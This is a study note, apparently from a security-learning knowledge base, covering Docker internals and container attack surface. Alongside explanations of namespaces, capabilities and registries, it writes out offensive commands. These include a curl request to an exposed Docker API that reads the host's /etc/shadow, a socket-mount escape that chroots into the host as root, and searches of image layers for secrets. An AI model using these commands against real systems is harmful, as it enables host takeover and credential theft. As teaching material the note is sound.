# 04.1 — Docker Fundamentals and Attack Surface

## What This Note Covers

What Docker is, how it works, and the complete attack surface — images, containers, registries, the Docker daemon, and the Linux kernel primitives that make containers work (and how they can fail).

---

## What Is Docker?

Docker is a containerisation platform that packages applications and their dependencies into **containers** — isolated, portable, lightweight runtime environments. Containers share the host OS kernel but are isolated from each other and the host using Linux kernel features.

### Key Difference from VMs

```
Virtual Machine:
  [App] [App]
  [OS]  [OS]
  [Hypervisor]
  [Hardware]

Container:
  [App] [App]
  [Container Runtime (Docker)]
  [Host OS Kernel] ← shared
  [Hardware]
```

Containers are not VMs. There is no hypervisor. The host kernel is shared. **This is why container escapes exist** — the isolation is enforced by software (namespaces, cgroups, seccomp) not hardware. Misconfiguration defeats it.

## Core Docker Concepts

### Images

A **Docker image** is a read-only template — a layered filesystem snapshot containing:
- Base OS (e.g., `ubuntu:22.04`, `alpine:3.18`)
- Application code
- Dependencies and libraries
- Configuration files
- Entrypoint/CMD (what runs when the container starts)

Images are built from a **Dockerfile** and stored in a **registry**.

```bash
# Pull an image from Docker Hub
docker pull nginx:latest

# List local images
docker images

# Inspect image layers and metadata
docker inspect nginx:latest

# Show image build history (each layer)
docker history nginx:latest

# Show what files changed between layers
docker diff CONTAINER_ID
```

### Layers

Every instruction in a Dockerfile creates a new layer. Layers are cached and shared between images. **Secrets added in one layer and deleted in the next are still present in the intermediate layer and extractable.**

```dockerfile
# BAD — secret exists in Layer 3 even though deleted in Layer 4
FROM ubuntu:22.04                    # Layer 1
RUN apt-get install -y curl          # Layer 2
COPY secret.txt /tmp/secret.txt      # Layer 3 — secret here
RUN rm /tmp/secret.txt               # Layer 4 — deleted but still in Layer 3

# GOOD — use multi-stage builds or build args
FROM ubuntu:22.04 AS build
ARG API_KEY  # passed at build time, not stored in image
RUN curl -H "Auth: $API_KEY" https://...
FROM ubuntu:22.04
COPY --from=build /app/binary /app/binary
```

### Containers

A **container** is a running instance of an image. It has:
- A writable layer on top of the image layers
- Its own network namespace (isolated networking)
- Its own PID namespace (isolated process tree)
- Its own mount namespace (isolated filesystem)
- Its own UTS namespace (isolated hostname)

```bash
# Run a container
docker run -d --name webserver nginx:latest

# List running containers
docker ps

# List all containers (including stopped)
docker ps -a

# Execute a command in a running container
docker exec -it webserver /bin/bash

# Inspect a running container
docker inspect webserver

# View container logs
docker logs webserver

# View running processes
docker top webserver
```

### Registries

A **registry** is where Docker images are stored and distributed.

| Registry | URL | Notes |
|---|---|---|
| Docker Hub | hub.docker.com | Default public registry |
| AWS ECR | *.dkr.ecr.region.amazonaws.com | AWS managed |
| Azure ACR | *.azurecr.io | Azure managed |
| GCR / Artifact Registry | gcr.io / pkg.dev | GCP managed |
| GitHub Container Registry | ghcr.io | GitHub integrated |
| Self-hosted | Any HTTPS endpoint | GitLab, JFrog Artifactory, etc. |

```bash
# Log in to a registry
docker login registry.example.com -u USERNAME -p PASSWORD
docker login  # Docker Hub

# Tag an image for a registry
docker tag myapp:latest registry.example.com/team/myapp:1.0

# Push
docker push registry.example.com/team/myapp:1.0

# Pull
docker pull registry.example.com/team/myapp:1.0
```

## Linux Kernel Isolation Mechanisms

Understanding these is essential for understanding why escape techniques work.

### Namespaces

Namespaces provide isolation — a container's processes see a different view of the system:

| Namespace | Isolates |
|---|---|
| **pid** | Process IDs — container has its own PID 1 |
| **net** | Network interfaces, routing tables, iptables |
| **mnt** | Filesystem mount points |
| **uts** | Hostname and domain name |
| **ipc** | Inter-process communication (semaphores, message queues) |
| **user** | User and group IDs (UID mapping) |

**Key insight:** If you can break out of a namespace — particularly the mount or pid namespace — you're on the host. The `--privileged` flag drops most namespace isolation.

### cgroups (Control Groups)

cgroups limit **resource usage** — CPU, memory, I/O. They don't provide security isolation, but:
- The `cgroup release_agent` file is writable in privileged containers
- This is a **container escape vector** (covered in [[04.2 — Docker Misconfigurations and Escape Techniques]])

### Capabilities

Linux **capabilities** divide root privileges into individual units. Docker drops most capabilities by default, but some are dangerous when granted:

| Capability | Risk |
|---|---|
| `CAP_SYS_ADMIN` | Near-root on host — many escape paths |
| `CAP_NET_ADMIN` | Modify network interfaces, routing |
| `CAP_SYS_PTRACE` | Trace processes in other namespaces |
| `CAP_DAC_OVERRIDE` | Bypass file permission checks |
| `CAP_SYS_MODULE` | Load kernel modules |

```bash
# Check capabilities of current process (inside container)
cat /proc/self/status | grep CapEff
# Decode:
capsh --decode=00000000a80425fb

# Check what capabilities a container was granted
docker inspect CONTAINER | grep -A20 CapAdd
```

### seccomp

**seccomp** filters restrict which system calls a container can make. Docker applies a default seccomp profile that blocks ~44 syscalls. When disabled (`--security-opt seccomp=unconfined`), the container can make any syscall — significantly expanding the escape surface.

### AppArmor / SELinux

Mandatory Access Control systems that restrict what container processes can do at the OS level. Docker applies an AppArmor profile (`docker-default`) when available. When disabled (`--security-opt apparmor=unconfined`), the OS-level MAC controls are removed.

## Docker Daemon Attack Surface

The Docker daemon (`dockerd`) is the background service that manages containers. It listens on:
- **Unix socket:** `/var/run/docker.sock` (default — local only)
- **TCP socket:** `tcp://0.0.0.0:2375` (unauthenticated) or `tcp://0.0.0.0:2376` (TLS)

### Exposed Docker Socket

If the socket is **exposed to the internet** (port 2375 with no auth):

```bash
# Check if remote Docker API is accessible
curl http://TARGET:2375/version

# List all containers
curl http://TARGET:2375/containers/json

# List all images
curl http://TARGET:2375/images/json

# Create a privileged container with host filesystem mounted
curl -X POST http://TARGET:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }'
```

### Docker Socket Mounted Inside a Container

If the Docker socket is mounted into a container (`-v /var/run/docker.sock:/var/run/docker.sock`), any process inside that container can control the Docker daemon — creating new privileged containers with host filesystem access.

```bash
# From inside a container with the socket mounted:
# Install Docker CLI
curl -fsSL https://get.docker.com | sh

# Escape: create a new privileged container with host filesystem
docker run -it --rm \
  -v /:/host \
  --privileged \
  alpine chroot /host /bin/bash
# You're now root on the host
```

> [!danger] Docker socket mount = immediate container escape
> Mounting `/var/run/docker.sock` into a container is one of the most critical misconfigurations in container security. Any process with access to it has effective root on the host.

## Registry Attack Surface

### Unauthenticated Registry Access

```bash
# Check if a registry has no authentication
curl https://REGISTRY/v2/_catalog
# Returns list of repositories if unauthenticated access is allowed

# List tags for a repository
curl https://REGISTRY/v2/REPO_NAME/tags/list

# Pull manifests
curl https://REGISTRY/v2/REPO_NAME/manifests/latest
```

### Extracting Secrets from Docker Layers

```bash
# Tool: dive — explore image layers interactively
brew install dive
dive IMAGE_NAME

# Tool: docker-explorer / extract layers manually
docker save IMAGE_NAME -o image.tar
tar xf image.tar -C ./extracted/
# Each layer is a tar file — extract and search for secrets

# Automated: truffleHog on Docker images
trufflehog docker --image IMAGE_NAME

# Manual extraction:
for layer in ./extracted/*/layer.tar; do
  tar tf $layer | grep -iE "\.env|secret|password|key|credential"
done

# Extract and search content
mkdir /tmp/layers && cd /tmp/layers
tar xf /path/to/layer.tar
grep -riE "password|secret|api_key|aws_access" . 2>/dev/null
```

## Quick Reference — Docker Assessment Commands

```bash
# Image inspection
docker images
docker history IMAGE_NAME
docker inspect IMAGE_NAME
docker save IMAGE_NAME -o image.tar && tar xf image.tar

# Container inspection
docker ps -a
docker inspect CONTAINER_NAME
docker exec -it CONTAINER_NAME /bin/bash
docker top CONTAINER_NAME

# Capability check (inside container)
cat /proc/self/status | grep CapEff
capsh --decode=HEX_VALUE

# Check for socket mount (inside container)
ls /var/run/docker.sock
ls /run/docker.sock

# Check for host filesystem mount (inside container)
mount | grep "on / "
ls /host/ 2>/dev/null  # if host is mounted at /host

# Remote API
curl http://TARGET:2375/version
curl http://TARGET:2375/containers/json

# Secret extraction from images
trufflehog docker --image IMAGE_NAME
docker save IMAGE | tar x -C /tmp/layers
```
